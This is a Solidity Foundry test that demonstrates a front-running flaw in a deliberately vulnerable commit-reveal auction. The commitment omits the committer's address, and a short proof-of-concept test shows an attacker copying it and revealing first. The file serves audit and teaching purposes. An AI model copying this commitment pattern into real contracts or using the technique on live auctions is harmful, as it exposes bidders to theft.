pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-FrA-4
 *
 * This test demonstrates a front-running vulnerability in a commit-reveal auction contract.
 * The vulnerability is that the protocol doesn't include the committer's address in the commitment,
 * allowing anyone to reveal another user's commitment and claim the reward.
 */

contract Auction {
    mapping(address => bytes32) public commitments;
    address public winner;
    uint256 public winningBid;
    bool public revealed;
    uint256 public endTime;

    constructor(uint256 _duration) {
        endTime = block.timestamp + _duration;
    }

    // Users commit their bids with a salt
    function commit(bytes32 commitment) public {
        require(block.timestamp < endTime, "Auction ended");
        commitments[msg.sender] = commitment;
    }

    // Vulnerable reveal function - doesn't include committer address in the commitment
    function reveal(uint256 bid, bytes32 salt) public {
        require(block.timestamp > endTime, "Reveal time not reached");
        require(!revealed, "Already revealed");

        // Vulnerability: commitment doesn't include the committer's address
        // This allows anyone to create the same commitment with the same bid and salt
        bytes32 expectedCommitment = keccak256(abi.encode(bid, salt));

        // The attacker can commit the same value and then reveal it
        require(commitments[msg.sender] == expectedCommitment, "Invalid commitment");

        // The revealer becomes the winner
        if (bid > winningBid) {
            winningBid = bid;
            winner = msg.sender;
        }
        revealed = true;
    }

    function claimReward() public view returns (address) {
        require(block.timestamp > endTime && revealed, "Auction not ended or not revealed");
        return winner;
    }
}

contract AuctionTest is Test {
    Auction public auction;
    address public bidder1;
    address public bidder2;
    uint256 public auctionDuration = 1 days;

    function setUp() public {
        bidder1 = address(1);
        bidder2 = address(2);
        auction = new Auction(auctionDuration);
        vm.warp(block.timestamp + 1 minutes);
    }

    function testFrontRunningReveal() public {
        uint256 bid1 = 1 ether;
        bytes32 salt1 = keccak256("secret1");

        // Both bidders create the same commitment with the same bid and salt
        // This is possible because the commitment doesn't include the committer's address
        bytes32 commitment = keccak256(abi.encode(bid1, salt1));

        // Bidder1 commits first
        vm.prank(bidder1);
        auction.commit(commitment);

        // Attacker sees the bid and salt values (e.g., from mempool or other side channel)
        // and commits the same values
        vm.prank(bidder2);
        auction.commit(commitment);

        vm.warp(block.timestamp + auctionDuration);

        // Attacker front-runs by revealing first
        vm.prank(bidder2);
        auction.reveal(bid1, salt1);

        // Attacker becomes the winner by front-running
        assertEq(auction.winner(), bidder2);
        assertEq(auction.winningBid(), bid1);
    }
}
